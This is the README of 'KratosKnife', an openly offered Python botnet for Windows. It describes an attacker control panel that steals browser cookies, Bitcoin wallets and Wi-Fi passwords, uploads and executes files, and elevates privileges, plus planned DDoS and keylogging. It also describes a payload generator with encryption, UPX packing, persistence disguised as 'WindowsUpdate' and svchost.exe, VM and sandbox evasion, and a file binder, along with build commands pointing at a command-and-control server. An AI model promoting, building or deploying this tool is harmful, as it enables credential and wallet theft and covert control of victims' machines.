<p align="center">
  <img src="https://github.com/Technowlogy-Pushpender/KratosKnife/blob/master/img/banner.png" alt="KratosKnife Logo" width=265 height=243/>
</p>

<h1 align="center">KratosKnife</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3.7-green.svg">
  </a>
  <a href="https://github.com/Technowlogy-Pushpender/KratosKnife/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/Technowlogy-Pushpender/KratosKnife/releases">
    <img src="https://img.shields.io/badge/Release-1.0-blue.svg">
  </a>
    <a href="https://github.com/Technowlogy-Pushpender/KratosKnife">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>


KratosKnife is a Advanced BOTNET Written in python 3 for Windows OS. Comes With Lot of Advanced Features such as Persistence &amp; VM Detection Methods, Built-in Binder, etc

## Disclaimer
<p align="center">
  :computer: This project was created only for good purposes and personal use.
</p>

THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.

## Note: Some Features are under development

## Commands Available In Attacker/Admin Panel

| **Clients Command**        | **Location**                | **Stealer**                  |
|----------------------------|-----------------------------|------------------------------|
| 1.	Ping 	                 | 1. Get Location Information | 1. Steal Firefox Cookie      |
| 2.	Upload & Execute File  | 2. Show Location On Map     | 2. Steal Chrome Cookie       |
| 3.	Show MessageBox        | **Computer Commands**       | 3. Steal Bitcoin Wallet      |
| 4.	Take Screenshot        | 1. Shutdown                 | 4. Steal WiFI Saved Password |
| 5.	Installed Software     | 2. Restart                  | **Computer Commands**        |
| 6.	Execute Scripts  	   	 | 3. Logoff	                 | 1. Shutdown                  |
| 7.	Elevate User Status    | **Open Webpage**            | 2. Restart                   |
| 8.	Clear TEMP Folder      | 1. Open Webpage (Visible)   | 3. Logoff                    |


| **Clients Commands**                        |
|---------------------------------------------|
| 1. Close Connection                         |
| 2. Move Client      [**Under Development**] |
| 3. Blacklist IP	    [**Under Development**] |
| 4. Update Client	  [**Under Development**] |
| 5. Restart Client	  [**Under Development**] |
| 6. Uninstall	      [**Under Development**] |


| **DDOS Attack**                    | **Keylogger**                           |
|------------------------------------|-----------------------------------------|
| Start DDOS [**Under Development**] | Start Keylogger [**Under Development**] |
| Stop DDOS  [**Under Development**] | Stop Keylogger  [**Under Development**] |
|                                    | Retrive Logs    [**Under Development**] |

## Generator Features
- [x] Encrypt Source Code Using AES 256 Bit Encryption 
- [x] Encrypt Source Code Using Base64 Encryption
- [x] Packing Evil Exe Using UPX Packer
- [x] Interactive Mode [**Generator Ask Required Parameter**] 
- [x] Debug Mode [**Can Be Used In Debugging Payload**]
- [x] Persistence Payload
- [x] 3 Powerfull Methods to Detect/Bypass VM (such as VirtualBox, VMware, Sandboxie)
- [x] Built-in File Binder 
- [x] Useful Icons Inside **icon** Folder


| Virtual Machine Bypass Methods Includes |
|-----------------------------------------|
| Registry Check                          |
| Processes and Files Check               |
| MAC Adderess Check                      |

## Screenshots

#### Login Page 
![](/img/loginpage.JPG)

#### Dashboard (Attacker Control Panel)
![](/img/adminpanel.JPG)

#### Show Victim Location On Map [NOTE: Location is IP Based, Not GPS]
![](/img/location.JPG)

## Prerequisite
- [x] Python 3.X
- [x] Few External Modules

## Usage
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/Technowlogy-Pushpender/KratosKnife.git

# Go into the repository
$ cd KratosKnife/Botnet-Generator

# Installing dependencies
$ python -m pip install -r requirements.txt

# Getting Help Menu
$ python Generator.py --help

# Making Payload/BOTNET
$ python Generator.py -s localhost/panel -o output_file_name --icon icon/exe.ico

```

## Available Arguments 
* Optional Arguments

| Short Hand         | Full Hand                       | Description                                                                 |
| ------------------ | ------------------------------- | --------------------------------------------------------------------------- |
| -h                 | --help                          | show this help message and exit                                             |
|                    | --interactive                   | Takes Input by asking Questions                                             |
|                    | --icon ICON                     | Specify Icon Path, Icon of Evil File [**Note : Must Be .ico**]              |
| -i INTERVAL        | --interval INTERVAL             | Time between reports in seconds. default=12.       [**Under Development**]  |
| -t TIME_PERSISTENT | --persistence TIME_PERSISTENT   | Becoming Persistence After __ seconds. default=10  [**Under Development**]  |
| -b file.txt        | --bind LEGITIMATE_FILE_PATH.pdf | Built-In Binder : Specify Path of Legitimate file. [**Under Development**]  |

* Required Arguments

| Short Hand  | Full Hand       | Description                          |
| ----------  | --------------- | ------------------------------------ |
| -s SERVER   | --server SERVER | Command & Control Server for Botnet. |
| -o OUT      | --output OUTPUT | Output file name.                    |

## Removing BOTNET

#### Method 1:

   * Go to start, type regedit and run the first program, this will open the registry editor.
   * Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run There should be an entry called "WindowsUpdate", right click this entry and select Delete.
   * Go to your user path > AppData > Roaming, you’ll see a file named “svchost.exe”, this is the RAT, right click > Delete.
   * Restart the System.

#### Method 2:
   * Run "RemoveBOTNET.bat" in Infected System.
   * Restart Infected PC to stop the current Running Evil File.
   * Run "RemoveBOTNET.bat" again.

## Contributors

* Panel Files are contributed by [BlackHacker511](https://github.com/BlackHacker511)

## TODO

- [ ] Add New features
- [ ] Add GUI BOTNET Generator

## Contact

singhpushpender250@gmail.com 

## Believes In Donation ?

- [ ] paypal me, Even 1 dollar of donation would be a great help :)
- [ ] paypal Address: <a href="https://paypal.me/anonyindia">https://paypal.me/anonyindia</a>
- [ ] paypal Email Address: singhpushpender250@gmail.com

## More Features Coming Soon...
